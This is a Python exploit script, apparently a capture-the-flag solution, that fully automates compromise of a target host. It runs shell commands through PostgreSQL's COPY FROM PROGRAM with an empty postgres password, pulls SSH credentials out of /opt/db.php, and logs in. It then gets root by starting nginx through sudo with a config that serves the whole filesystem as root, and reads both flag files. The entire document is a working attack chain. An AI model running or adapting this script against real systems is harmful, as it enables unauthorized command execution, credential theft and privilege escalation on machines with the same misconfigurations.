#!/usr/bin/env python3
import sys
import time
import psycopg2
import paramiko
import re
 
if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <IP>")
    sys.exit(1)
 
IP = sys.argv[1]
 
print(f"[*] Starting AutoPwn against {IP}")

print("[*] Exploiting PostgreSQL (port 5432) to read /opt/db.php...")
try:
    conn = psycopg2.connect(
        host=IP,
        user="postgres",
        password="",
        dbname="postgres",
        connect_timeout=5
    )
    conn.autocommit = True
    cur = conn.cursor()
    

    cur.execute("CREATE TABLE IF NOT EXISTS exploit_cmd(cmd_output text);")
    cur.execute("DELETE FROM exploit_cmd;")
    
    cur.execute("COPY exploit_cmd FROM PROGRAM 'cat /opt/db.php';")
    cur.execute("SELECT * FROM exploit_cmd;")
    
    output = cur.fetchall()
    
    ssh_user = None
    ssh_pass = None
    
    for row in output:
        line = row[0]
        if "'username' =>" in line:
            ssh_user = line.split("'")[3]
        if "'password' =>" in line:
            ssh_pass = line.split("'")[3]
            
    if not ssh_user or not ssh_pass:
        print("[-] Failed to extract credentials from db.php")
        sys.exit(1)
        
    print(f"[+] Found credentials: {ssh_user}:{ssh_pass}")
    cur.execute("DROP TABLE exploit_cmd;")
    cur.close()
    conn.close()
 
except Exception as e:
    print(f"[-] PostgreSQL exploit failed: {e}")
    sys.exit(1)
 

print(f"[*] Connecting to SSH as {ssh_user}...")
try:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(IP, username=ssh_user, password=ssh_pass, timeout=5)
    
    stdin, stdout, stderr = ssh.exec_command("cat /home/wvverez/user.txt")
    user_flag = stdout.read().decode('utf-8').strip()
    print(f"[+] User Flag: {user_flag}")
    

    print("[*] Escalating privileges via sudo nginx...")
    nginx_conf = """user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 8080;
        root /;
        autoindex on;
    }
}
"""

    cmd_write = f"cat << 'EOF' > /tmp/pwn.conf\n{nginx_conf}\nEOF"
    ssh.exec_command(cmd_write)
    time.sleep(1)
    

    ssh.exec_command("sudo /usr/sbin/nginx -c /tmp/pwn.conf")
    time.sleep(2)
    

    stdin, stdout, stderr = ssh.exec_command("curl -s http://localhost:8080/root/root.txt")
    root_flag = stdout.read().decode('utf-8').strip()
    
    if root_flag:
        print(f"[+] Root Flag: {root_flag}")
    else:
        print("[-] Failed to get root flag.")
    

    ssh.exec_command("sudo pkill nginx")
    ssh.exec_command("rm /tmp/pwn.conf")
    ssh.close()
    
except Exception as e:
    print(f"[-] SSH exploitation failed: {e}")
    sys.exit(1)
 
print("[*] AutoPwn complete!")
